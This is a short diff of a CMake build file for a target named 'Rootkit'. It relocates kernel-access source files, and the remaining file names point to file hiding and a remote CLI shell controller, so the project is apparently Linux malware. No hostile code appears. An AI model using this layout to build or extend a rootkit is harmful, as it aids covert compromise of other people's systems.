@@ -48,11 +48,11 @@ add_executable(Rootkit
 
         linux/file_hiding_access/file_hiding_access.cpp
         linux/file_hiding_access/file_hiding_access.h
-        linux/file_hiding_access/kernel_access/kernel_access.cpp
-        linux/file_hiding_access/kernel_access/kernel_access.h
-        linux/file_hiding_access/kernel_access/operations_ids.h
-        linux/file_hiding_access/kernel_access/msg_to_module.h
-        linux/file_hiding_access/kernel_access/msg_to_user.h
+        linux/kernel_access/kernel_access.cpp
+        linux/kernel_access/kernel_access.h
+        linux/kernel_access/operations_protocol.h
+        linux/kernel_access/msg_to_module.h
+        linux/kernel_access/msg_to_user.h
 
         linux/features/remote_cli_shell_controller/remote_cli_shell_controller.cpp
         linux/features/remote_cli_shell_controller/remote_cli_shell_controller.h
